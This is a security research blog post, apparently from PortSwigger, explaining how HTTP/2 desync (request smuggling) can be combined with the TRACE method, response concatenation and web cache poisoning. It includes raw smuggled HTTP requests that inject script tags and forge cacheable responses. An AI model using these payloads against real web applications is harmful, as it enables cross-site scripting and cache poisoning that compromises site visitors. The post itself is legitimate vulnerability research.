# Making desync attacks easy with TRACE

Source: https://portswigger.net/research/trace-desync-attack
Fetched: 2026-06-28T09:17:31.792243+00:00

Making desync attacks easy with TRACE

Martin Doyhenard

Researcher

@PortSwiggerRes

Published: Tuesday, 19 March 2024 at 14:00 UTC

Updated: Wednesday, 19 June 2024 at 13:58 UTC

Have you ever found an HTTP desync vulnerability that seemed impossible to exploit due to its complicated constraints? In this blogpost we will explore a new exploitation technique that can be used to completely compromise a web application using TRACE - an ancient HTTP method that's more widely supported than you might think.

I recently came across an HTTP/2 Desync vulnerability (a.k.a HTTP request smuggling) in a Bug Bounty program that had some HTTP/2 header injection issues. Specifically, it was possible to inject a line break character in a header’s value, letting me smuggle transfer-encoding header which would eventually split the request at backend.

After confirming the vulnerability and submitting it to the program, I received the following message:

“

Thank you for your submission. Being able to smuggle a request is not a vulnerability in itself. How are you able to exploit the smuggling request?

.”

Although saying that smuggling a request is not a vulnerability by itself seems like a bold statement in 2024, I was confident enough I could craft a good Proof of Concept to demonstrate impact.

But after looking at the application for a few hours I started worrying, as there was no endpoint I could use to create my payload. There were no other vulnerabilities to leverage with request smuggling, nor reflected parameters that could be used with response smuggling, and even worse, the connections between the frontend and backend appeared to be isolated from each other so I couldn't directly attack other users. I was able to use a HEAD smuggled request to split messages in the response queue, but besides that, this host seemed to be unexploitable.

The TRACE method

At that moment I noticed something interesting. The backend server was configured to respond to TRACE requests.

For those unfamiliar with this method, the HTTP RFC states:

"The TRACE method requests a remote, application-level loop-back of the request message. The final recipient of the request SHOULD reflect the message received…”

This means that if we send a request like:

TRACE / HTTP/1.1

Host: vulnerable.com

SomeHeader: <script>alert(“reflected”)</script>

We would obtain a response with the same request in the body, and with “message/http” as the content-type:

HTTP/1.1 200 OK

Content-Type: message/http

Content-Length: 125

TRACE / HTTP/1.1

Host: vulnerable.com

SomeHeader: <script>alert(“reflected”)</script>

X-Forwarded-For: xxx.xxx.xxx.xxx

Even though you might think that the TRACE method is not really used in modern systems, some of the most popular web servers have this feature active by default and need to be disabled explicitly. Servers like Apache and many Microsoft IIS and Tomcat versions will respond to TRACE requests if no custom configuration is applied.

TRACE request can be really helpful when analysing a smuggling vulnerability. That’s because the response will show us exactly what is being received by the backend.

Being able to see the forwarded request can give information about headers that are modified or added (like the X-Forwarded-For header) by the proxy and even protocol modifications, such as downgrading from HTTP/2 to HTTP/1.1, which is the source of many desync vulnerabilities.

But what’s even more interesting is that we can use the TRACE response to build a payload to completely compromise the application, by combining it with Response Smuggling and Web Cache Poisoning. Let's see how:

Response Smuggling Recap

For those unfamiliar with Response Concatenation, the basic idea is to smuggle a HEAD request which will produce a response containing only headers. According to the HTTP RFC, this response can contain a content-length header which must have the same value that the GET response would have. This header should be ignored by a proxy when the response is matched to the HEAD request.

However, as the HEAD message was smuggled and the proxy never noticed this, the content-length will not be ignored, causing a concatenation with the next available response.

As an example, consider the following request which is used to exploit a server vulnerable to CL.0 desynchronization:

GET / HTTP/1.1

Host: vulnerable.com

Content-Length: 108

HEAD / HTTP/1.1

Host: vulnerable.com

GET /reflect?value=myReflectedString HTTP/1.1

Host: vulnerable.com

The first response will be forwarded to the attacker as usual.

But, as the proxy never saw a HEAD request, it will parse the content-length of the next response as it would normally do, using the next response as part of the body.

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 82

HTTP/1.1 200 OK

Content-Type: text/plain

Content-Length: 17

myReflectedString

Using this technique, an attacker can concatenate responses, using headers as body and modifying the behaviour of a message, by changing the content-type of a payload like in the previous example.

Exploiting Desync with TRACE

Going back to the HTTP/2 Desync vulnerability, I had no endpoint that reflected something useful in either the headers or the body of a response. But what about the TRACE request?

As TRACE responses will reflect any header that the backend receives, we can use it to generate a malicious script and place it in the body of the HEAD response:

GET / HTTP/1.1

Host: vulnerable.com

Content-Length: 150

HEAD / HTTP/1.1

Host: vulnerable.com

TRACE / HTTP/1.1

Host: vulnerable.com

SomeHeader: <script>alert(“reflected”)</script>

Other: aaaaaa…

Resulting in the following responses:

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 165

HTTP/1.1 200 OK

Content-Type: message/http

Content-Length: 110

TRACE / HTTP/1.1

Host: vulnerable.com

SomeHeader: <script>alert(“reflected”)</script>

Other: aaaaaa….

The response will be forwarded to the next request that arrives through the same connection, taking control of the browser with a malicious JavaScript!

This technique, as powerful as it seems, requires the server to respond to TRACE requests, which might seem unlikely in most production environments.

As this method should only be used for debugging purposes, it's common for proxies to block these requests using some firewall rule which will return a Forbidden response.

But, as smuggling can be used to bypass firewall rules, it is possible to hide a TRACE message from the proxy and deliver it directly to the backend. So even if the method is forbidden, exploitation through desynchronization is still possible.

So far I was able to desynchronize the connections to reflect an arbitrary payload in a response. Yet, as the backend connections were isolated from each other, the malicious response will only be received by the user who issued it.

Even when connections are not shared between users, there are two techniques that can be used to exploit this condition: Web Cache Poisoning and Client-Side Desync.

In this case, Client-Side desync was out of the table (HTTP/2 injection was required), but the application was storing static responses in the cache, which meant that Web Cache Poisoning was possible.

Using Response Concatenation, it is possible to choose a response that contains a Content-Length and Cache-Control headers that forces the response to be stored in the cache.

Even though I was able to find many potential candidate endpoints, none of them had a Content-Type header with value text/html. This means that even if I was able to store my payload with one of these responses, the browser would not execute my malicious Javascript.

At that point I could have just sent the desync attack first, followed by a request to a static resource like “/payload.css” through the same HTTP/2 connection and store the response for that endpoint. Anyone requesting for “/payload.css” would receive the evil payload from the cache and the javascript would be executed.

Although this attack might have worked, to affect a user it was necessary to overwrite the cached response of an existing resource, and depending on how the page is loaded and the max-age of the response, it could be quite hard to effectively exploit a victim’s browser.

From TRACE to Response Splitting

Still, there was a better option. When I researched response smuggling I theorised a case in which the attacker could split a response in order to create an arbitrary message that would be stored in cache.

For this to be possible it is necessary that the application allows some content reflection which includes line breaks, so that the attacker can write response headers as well as the payload:

GET / HTTP/1.1

Host: vulnerable.com

Content-Length: 360

HEAD /smuggled HTTP/1.1

Host: vulnerable.com

POST /reflect HTTP/1.1

Host: vulnerable.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n

Content-Type: text/html\r\n

Cache-Control: max-age=1000000\r\n

Content-Length: 44\r\n

\r\n

<script>alert(“arbitrary response”)</script>

Which would create the following responses:

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 0

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 165

HTTP/1.1 200 OK

Content-Type: text/plain

Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok

Content-Type: text/html

Cache-Control: max-age=1000000

Content-Length: 50

<script>alert(“arbitrary response”)</script>

As previously explained, the last message will be used to complete the HEAD response, but in this case, only the first 78 bytes will be concatenated.

If the remaining bytes do not correspond to a valid HTTP message, the proxy would forward a 500 error message or just close the connection after forwarding the previous response.

But, in that case, the proxy is able to correctly parse the remaining payload as a valid HTTP response. For that reason, the message will be forwarded as the response of the next available request.

By this, the attacker was able to generate an arbitrary response including headers and body, that will be stored in the cache for the URL specified in a following request.

Finding an endpoint that allows us to reflect any byte sent in the body is extremely rare, but if TRACE requests are permitted, the attack is completely practical.

Note that, depending on the configuration, TRACE requests cannot contain a content-length header bigger than 0, and therefore is not possible to add the Javascript payload in the same request. We can add an extra response that generates the body of the payload using the same technique described above.

Some servers like Apache will allow a body If the “TraceEnabled extended” directive is present, which makes the attack even more simple.

If the body is not allowed, the message length header can be added using a smuggled transfer-encoding or with an extra response which will be appended right after the last header of the TRACE message:

GET / HTTP/1.1

Host: vulnerable.com

Content-Length: 268

HEAD /smuggled HTTP/1.1

Host: vulnerable.com

TRACE / HTTP/1.1

Host: vulnerable.com

A: HTTP/1.1 200 Ok

Cache-Control: max-age=1000000

HEAD /smuggled HTTP/1.1

Host: vulnerable.com

TRACE / HTTP/1.1

Host: vulnerable.com

A: <script>alert(“XSS”)</script>

Which would generate the following responses

HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 0

HTTP/1.1 200 Ok

Content-Type: text/html

Content-Length: 165

HTTP/1.1 200 Ok

Content-Type: message/http

Content-Length: 150

TRACE / HTTP/1.1

Host: vulnerable.com

Padding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

A: HTTP/1.1 200 OK

Cache-Control: max-age=1000000

B: HTTP/1.1 200 OK

Content-Type: text/html

Content-Length: 165

HTTP/1.1 200 Ok

Content-Type: message/http

Content-Length: 79

TRACE / HTTP/1.1

Host: vulnerable.com

A: <script>alert(“Arbitrary XSS”)</script>

If the TRACE implementation makes it impossible to append a message-length header in the response, it is also possible to create a redirect response that will be stored in the cache. This can either redirect to a stored payload (using the cache deception/poisoning technique), or to an attacker’s page to launch another attack like client-side desync or classic phishing.

Conclusion

In summary, this case shows how using forgotten methods like TRACE, combined with modern techniques such as HTTP Desync and Cache Poisoning, can lead to serious security issues in web applications. Even though TRACE is an old method, it proves to be very effective for attackers who know how to use it creatively.

This reminds us that we should never underestimate older technologies, as they can be used in new ways to create significant challenges for cybersecurity.

Trace

Request Smuggling

Web Caching

Martin Favourites

Back to all articles

Related Research

How to distinguish HTTP pipelining from request smuggling

19 August 2025

How to distinguish HTTP pipelining from request smuggling

06 August 2025

Gotta cache 'em all: bending the rules of web cache exploitation

08 August 2024

Gotta cache 'em all: bending the rules of web cache exploitation

Making HTTP header injection critical via response queue poisoning

22 September 2022

Making HTTP header injection critical via response queue poisoning
